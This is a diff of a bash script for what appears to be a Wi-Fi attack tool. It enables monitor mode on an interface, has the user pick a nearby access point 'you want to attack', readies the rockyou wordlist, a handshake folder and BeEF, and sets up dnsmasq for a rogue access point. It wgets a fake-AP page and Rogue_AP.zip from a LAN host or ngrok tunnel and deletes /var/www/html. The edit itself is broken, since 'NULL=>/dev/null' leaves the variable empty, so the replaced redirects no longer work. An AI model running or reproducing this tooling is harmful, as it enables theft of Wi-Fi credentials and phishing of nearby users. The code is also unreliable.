@@ -9,6 +9,7 @@ cat <<-_EOF_
 ###########################################################################                                                                 
 	_EOF_
 sleep 1
+NULL=>/dev/null
 INDEX=index.html
 ROGUE=Rogue_AP.zip
 red=`tput setaf 1`
@@ -17,11 +18,14 @@ yellow=`tput setaf 3`
 resetColor=`tput sgr0`
 DELAY=3
 MON=mon 
-service apache2 stop 2&>/dev/null
-gunzip /usr/share/wordlists/rockyou.txt.gz >/dev/null
+service apache2 stop 2&$NULL
+gunzip /usr/share/wordlists/rockyou.txt.gz $NULL
 echo 1 > /proc/sys/net/ipv4/ip_forward
-mkdir ~/Handshakes/ >/dev/null
-mkdir /etc/beef/ >/dev/null
+mkdir ~/Handshakes/ $NULL
+mkdir /etc/beef/ $NULL
+mkdir /var/ $NULL
+mkdir /var/www/ $NULL
+mkdir /var/www/html $NULL
 clear
 ##################################################################################################
 
@@ -57,9 +61,9 @@ unmanaged-devices:mac=AA:BB:CC:DD:EE:FF" >> /etc/NetworkManager/NetworkManager.c
 read -p "${red}Are you installing this with an ngrok code[y] or through lan[n]? Leave blank if you don't need the html files : ${resetColor}" HTML
 
 	if [ $HTML == n ] ; then
-		rm -r /var/www/html >/dev/null
+		rm -r /var/www/html $NULL
 		sleep 1
-		mkdir /var/www/html/ >/dev/null
+		mkdir /var/www/html/ $NULL
 		wget 192.168.2.21:8080/$INDEX
 		wget 192.168.2.21:8080/$ROGUE
 		sleep 1
@@ -73,9 +77,9 @@ read -p "${red}Are you installing this with an ngrok code[y] or through lan[n]? 
 
 	if [ $HTML == y ] ; then
 		read -p "${yellow}Enter the code here [example 12345678]: ${resetColor}" NGROK
-		rm -r /var/www/html >/dev/null
+		rm -r /var/www/html $NULL
 		sleep 1
-		mkdir /var/www/html/ >/dev/null
+		mkdir /var/www/html/ $NULL
 		wget http://$NGROK.ngrok.io/$INDEX
 		wget http://$NGROK.ngrok.io/$ROGUE
 		sleep 1
@@ -123,7 +127,7 @@ if [[ "$CHOICE" =~ ^[1-7]$ ]]; then
 	if [[ $CHOICE == 1 ]] ; then
 	echo "${green}Putting your chosen interface into monitor mode ... ${resetColor}"
 	ifconfig $INTERFACE up 
-	airmon-ng start $INTERFACE >/dev/null
+	airmon-ng start $INTERFACE $NULL
 	clear
 	echo "I'm about to show you all the nearby access points, make sure it runs for 10-15 seconds and you copy the bssid and the channel you want to attack."
 	sleep 5   
@@ -168,7 +172,7 @@ if [[ "$CHOICE" =~ ^[1-7]$ ]]; then
 	if [[ $CHOICE == 3 ]] ; then
 	echo "${green}Putting your chosen interface into monitor mode ... ${resetColor}"
 	ifconfig $INTERFACE up
-	airmon-ng start $INTERFACE >/dev/null
+	airmon-ng start $INTERFACE $NULL
 	clear
 	echo "I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack."
 	sleep 5   
@@ -187,7 +191,7 @@ if [[ "$CHOICE" =~ ^[1-7]$ ]]; then
 	if [[ $CHOICE == 4 ]] ; then
 	echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
 	ifconfig $INTERFACE up
-	airmon-ng start $INTERFACE >/dev/null
+	airmon-ng start $INTERFACE $NULL
 	clear
 	echo "Setting up your dnsmasq.conf ... "
 	echo "interface=at0
@@ -250,7 +254,7 @@ listen-address=127.0.0.1 " > /bin/dnsmasq.conf
 	if [[ $CHOICE == 5 ]] ; then
 	echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
 	ifconfig $INTERFACE up
-	airmon-ng start $INTERFACE >/dev/null
+	airmon-ng start $INTERFACE $NULL
 	clear
 	echo "Setting up dnsmasq.conf ... "
 	echo "interface=at0
@@ -323,8 +327,8 @@ fi
 
 	if [[ $CHOICE == 7 ]] ; then 
 	echo "Cleaning up ... "
-	airmon-ng stop $INTERFACE$MON >/dev/null
-	ifconfig $INTERFACE up >/dev/null
+	airmon-ng stop $INTERFACE$MON $NULL
+	ifconfig $INTERFACE up $NULL
 	service network-manager restart
 	iptables --flush
 	sleep 1
